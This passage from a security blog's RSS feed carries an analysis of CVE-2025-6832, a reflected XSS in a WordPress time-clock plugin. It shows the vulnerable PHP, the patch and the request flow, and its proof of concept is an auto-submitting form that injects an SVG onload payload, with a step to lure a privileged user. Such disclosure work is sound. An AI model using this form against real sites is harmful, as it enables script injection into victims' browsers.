1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-statistics/vulnerability/wordpress-wp-statistics-plugin-14-5-4-unauthenticated-stored-cross-site-scripting-via-user-agent-header-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Statistics &amp;lt;= 14.15.4 - CVE-2025-9816&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6832 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-07-cve-2025-6832/</link>
      <pubDate>Tue, 07 Oct 2025 17:38:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-07-cve-2025-6832/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;Reflected Cross-Site Scripting (XSS) vulnerability&lt;/strong&gt; in the &lt;strong&gt;All in One Time Clock Lite&lt;/strong&gt; plugin for WordPress.&#xA;The vulnerability originates from the &lt;strong&gt;nonce&lt;/strong&gt; parameter in versions up to and including &lt;strong&gt;2.0&lt;/strong&gt;, due to &lt;strong&gt;insufficient input handling&lt;/strong&gt; and &lt;strong&gt;lack of output escaping&lt;/strong&gt;.&#xA;An attacker (including unauthenticated) can inject arbitrary script snippets into the page; these scripts will execute when the victim performs the manipulated action (for example: clicking a link).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6832&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6832&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/aio-time-clock-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress All in One Time Clock Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;All in One Time Clock Lite&lt;/strong&gt;: &lt;strong&gt;v2.0&lt;/strong&gt; (vulnerable) and &lt;strong&gt;v2.0.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;strong&gt;Meld&lt;/strong&gt; or any diff comparison tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;In the &lt;strong&gt;vulnerable&lt;/strong&gt; version, the &lt;code&gt;nonce&lt;/code&gt; parameter is taken directly from &lt;code&gt;$_POST&lt;/code&gt; with &lt;strong&gt;no sanitization&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? $_POST[&amp;#34;nonce&amp;#34;] : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;strong&gt;patched&lt;/strong&gt; version, the &lt;code&gt;nonce&lt;/code&gt; parameter is processed with &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt; before use, preventing injection of malicious code:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? sanitize_text_field($_POST[&amp;#34;nonce&amp;#34;]) : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The patch adds an input filtering layer for the &lt;code&gt;nonce&lt;/code&gt; variable, ensuring data received from the request will have dangerous characters removed before further processing.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/diff.png&#34; title=&#34;Code change comparison between vulnerable and patched versions&#34; data-thumbnail=&#34;/posts/2025-10-07-cve-2025-6832/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff — code change comparison between vulnerable and patched versions&lt;/h2&gt;&lt;p&gt;Code change comparison between vulnerable and patched versions&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-07-cve-2025-6832/diff.png&#39; alt=&#34;Diff — code change comparison between vulnerable and patched versions&#34; height=&#34;132&#34; width=&#34;1768&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Code change comparison between vulnerable and patched versions&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerability is located in the function &lt;code&gt;aio_time_clock_lite_js()&lt;/code&gt; of the class &lt;code&gt;AIO_Time_Clock_Lite_Actions&lt;/code&gt; in the file &lt;code&gt;aio-time-clock-lite-actions.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function aio_time_clock_lite_js()&#xA;{&#xA;    // other logic       &#xA;    $nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? $_POST[&amp;#34;nonce&amp;#34;] : null;&#xA;&#xA;    if (wp_verify_nonce($nonce, &amp;#39;time-clock-nonce&amp;#39;)) {&#xA;        // other logic            &#xA;    } else {&#xA;        echo json_encode(&#xA;            [&#xA;                &amp;#34;response&amp;#34;     =&amp;gt; &amp;#34;failed&amp;#34;,&#xA;                &amp;#34;message&amp;#34;      =&amp;gt; esc_attr_x(&amp;#34;Not authorized to perform this action&amp;#34;, &amp;#39;aio-time-clock-lite&amp;#39;),&#xA;                &amp;#34;nonce&amp;#34;        =&amp;gt; $nonce,&#xA;                &amp;#34;clock_action&amp;#34; =&amp;gt; $clock_action,&#xA;            ]&#xA;        );&#xA;    }&#xA;&#xA;    wp_reset_postdata();&#xA;    die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;aio-time-clock-lite-actions.php&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;wp_verify_nonce()&lt;/code&gt; function compares the &lt;code&gt;$nonce&lt;/code&gt; value sent from the client with a valid value previously generated by the server using &lt;code&gt;wp_create_nonce()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;time-clock-nonce&amp;#34; id=&amp;#34;time-clock-nonce&amp;#34; value=&amp;#34;&amp;lt;?php echo wp_create_nonce(&amp;#34;time-clock-nonce&amp;#34;); ?&amp;gt;&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;aio-settings.php&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;$nonce&lt;/code&gt; is invalid =&amp;gt; it goes to the &lt;code&gt;else&lt;/code&gt; branch returning a &lt;strong&gt;JSON&lt;/strong&gt; error that contains &lt;code&gt;$nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Clicking &lt;code&gt;2 references&lt;/code&gt; shows that the function &lt;code&gt;public function aio_time_clock_lite_js()&lt;/code&gt; is registered as a callback for action hooks:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/ref1.png&#34; title=&#34;Callback registration for ajax hooks&#34; data-thumbnail=&#34;/posts/2025-10-07-cve-2025-6832/ref1.png&#34; data-sub-html=&#34;&lt;h2&gt;Callback registration for ajax hooks&lt;/h2&gt;&lt;p&gt;Callback registration for ajax hooks&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-07-cve-2025-6832/ref1.png&#39; alt=&#34;Callback registration for ajax hooks&#34; height=&#34;374&#34; width=&#34;1080&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Callback registration for ajax hooks&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;em&gt;The function aio_time_clock_lite_js() is attached to two Ajax hooks (authenticated &amp;amp; unauthenticated)&lt;/em&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_aio_time_clock_lite_js&lt;/code&gt; (authenticated).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_aio_time_clock_lite_js&lt;/code&gt; (unauthenticated). =&amp;gt; Focus&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: The &lt;code&gt;nonce&lt;/code&gt; parameter is taken directly from &lt;code&gt;$_POST&lt;/code&gt; (unauthenticated request).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: The &lt;code&gt;nonce&lt;/code&gt; value is reflected back in &lt;code&gt;echo json_encode(...)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Send a POST request (unauthenticated) to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;strong&gt;params&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=aio_time_clock_lite_js&amp;amp;nonce=nonce_value&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;The callback &lt;code&gt;aio_time_clock_lite_js()&lt;/code&gt; is invoked&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;nonce&lt;/code&gt; value is checked =&amp;gt; &lt;strong&gt;invalid&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;nonce&lt;/code&gt; value is reflected into the response body via &lt;code&gt;echo json_encode(...)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Create a webpage containing a submit form:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;&#xA;  &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;action&amp;#34; value=&amp;#34;aio_time_clock_lite_js&amp;#34;&amp;gt;&#xA;  &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;nonce&amp;#34; value=&amp;#34;&amp;lt;svg onload=alert()&amp;gt;&amp;#34;&amp;gt;&#xA;&amp;lt;/form&amp;gt;&#xA;&amp;lt;script&amp;gt;document.forms[0].submit()&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Send the link to the page containing the form to a user with privileges.&lt;/li&gt;&#xA;&lt;li&gt;Observe the injected &lt;strong&gt;JavaScript&lt;/strong&gt; executing.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/result.png&#34; title=&#34;Result — PoC execution screenshot&#34; data-thumbnail=&#34;/posts/2025-10-07-cve-2025-6832/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result — PoC execution screenshot&lt;/h2&gt;&lt;p&gt;Result — PoC execution screenshot&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-07-cve-2025-6832/result.png&#39; alt=&#34;Result — PoC execution screenshot&#34; height=&#34;1119&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result — PoC execution screenshot&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-6832&lt;/strong&gt; vulnerability in &lt;strong&gt;All in One Time Clock Lite &amp;lt;= 2.0&lt;/strong&gt; allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to exploit a Reflected XSS via the &lt;code&gt;nonce&lt;/code&gt; parameter. The &lt;strong&gt;2.0.1&lt;/strong&gt; patch added &lt;code&gt;sanitize_text_field()&lt;/code&gt; to filter input, preventing malicious code from being reflected in the JSON response.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;sanitize&lt;/strong&gt; and &lt;strong&gt;escape&lt;/strong&gt; data before returning it in responses.&lt;/li&gt;&#xA;&lt;li&gt;Endpoints exposed to &lt;strong&gt;nopriv (unauthenticated)&lt;/strong&gt; requests should be carefully reviewed.&lt;/li&gt;&#xA;&lt;li&gt;Reflected XSS commonly occurs when input values are directly reflected into output (JSON/HTML).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Updating the plugin&lt;/strong&gt; promptly is the simplest way to reduce risk.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a 